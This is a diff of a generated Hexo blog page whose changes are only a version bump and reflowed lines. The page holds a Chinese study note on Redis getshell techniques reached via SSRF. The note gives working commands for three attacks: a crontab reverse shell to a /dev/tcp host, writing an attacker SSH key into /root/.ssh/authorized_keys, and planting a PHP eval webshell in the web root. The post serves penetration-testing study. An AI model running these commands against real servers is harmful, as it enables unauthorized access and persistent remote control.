@@ -69,7 +69,7 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -177,9 +177,11 @@
   <div class="content e-content" itemprop="articleBody">
     <p>之前做杭电的hgame的时候有一道ssrf打sql的题,当时找资料的时候倒是很多ssrf打redis的东西,这次学习一下吧,顺便总结一下</p>
 <h2 id="概述">概述</h2>
-<p>首先redis是个非关系型数据库,然后redis更偏向于memcache一点,它是一个key-value型的数据库,信息以键值形式存在内存中。当然你也可以用save把它存至硬盘,这个时候就可能会getshell了 几种简单的方法</p>
+<p>首先redis是个非关系型数据库,然后redis更偏向于memcache一点,它是一个key-value型的数据库,信息以键值形式存在内存中。当然你也可以用save把它存至硬盘,这个时候就可能会getshell了
+几种简单的方法</p>
 <blockquote>
-<p>1.通过向web目录写webshell来getshell 2.写ssh-key来getshell 3.写crontab来getshell</p>
+<p>1.通过向web目录写webshell来getshell 2.写ssh-key来getshell
+3.写crontab来getshell</p>
 </blockquote>
 <p>当然,这些攻击都包含一些要求,比如当前用户的权限,目录权限,web目录是否已知等,怎么利用还是看具体场合</p>
 <h2 id="redis服务器搭建">redis服务器搭建</h2>
@@ -187,7 +189,8 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
 <p><strong>第2步：redis解压、编译</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p><strong>第3步：启动redis服务</strong> 新版本的redis默认监听本地,我们可以改成0.0.0.0</p>
+<p><strong>第3步：启动redis服务</strong>
+新版本的redis默认监听本地,我们可以改成0.0.0.0</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure>
 <p>然后启动服务</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /root/redis-4.0.9/redis.conf</span><br></pre></td></tr></table></figure>
@@ -203,7 +206,8 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure>
 <p><strong>4.保存</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>然后上服务器监听就ok了 不过这种方式我并没有getshell过,原因位置,后续再慢慢看吧...</p>
+<p>然后上服务器监听就ok了
+不过这种方式我并没有getshell过,原因位置,后续再慢慢看吧...</p>
 <h3 id="写sshkey来getshell"><strong>写sshkey来getshell</strong></h3>
 <p><strong>1.生产密钥</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
@@ -211,12 +215,24 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n\n\n&quot;) &gt; pub.txt</span><br></pre></td></tr></table></figure>
 <p><strong>2.将密钥写到服务器</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">config set 233 &quot;xxxx&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>这里的xxx就是pub.txt里面的东西,其实可以直接copy 一下id_rsa.pub里面的东西,然后前后加回车即可。 <strong>3.连接就ok了</strong></p>
+<p>这里的xxx就是pub.txt里面的东西,其实可以直接copy
+一下id_rsa.pub里面的东西,然后前后加回车即可。
+<strong>3.连接就ok了</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
 <h3 id="写webshell"><strong>写webshell</strong></h3>
-<p>一样的原理 不过限制就是:要求web目录已知,而且当前用户在目录有写权限</p>
+<p>一样的原理
+不过限制就是:要求web目录已知,而且当前用户在目录有写权限</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/test.com/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;fuck&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>这里先把redis下的攻击方式写一下,后续应该还会分析一下phithon的那篇ssrf和python的博客。 参考链接: <a target="_blank" rel="noopener" href="http://foreversong.cn/archives/1180" title="http://foreversong.cn/archives/1180">http://foreversong.cn/archives/1180</a> Adog-redis在渗透测试中的利用 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" title="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a> phithon-利用redis写webshell <a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/03/redis-getshell/" title="https://lorexxar.cn/2016/12/03/redis-getshell/">https://lorexxar.cn/2016/12/03/redis-getshell/</a> Lorexxar-通过redis getshell的一些小问题</p>
+<p>这里先把redis下的攻击方式写一下,后续应该还会分析一下phithon的那篇ssrf和python的博客。
+参考链接: <a target="_blank" rel="noopener" href="http://foreversong.cn/archives/1180"
+title="http://foreversong.cn/archives/1180">http://foreversong.cn/archives/1180</a>
+Adog-redis在渗透测试中的利用 <a
+target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html"
+title="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a>
+phithon-利用redis写webshell <a
+target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/03/redis-getshell/"
+title="https://lorexxar.cn/2016/12/03/redis-getshell/">https://lorexxar.cn/2016/12/03/redis-getshell/</a>
+Lorexxar-通过redis getshell的一些小问题</p>
 
   </div>
 </article>
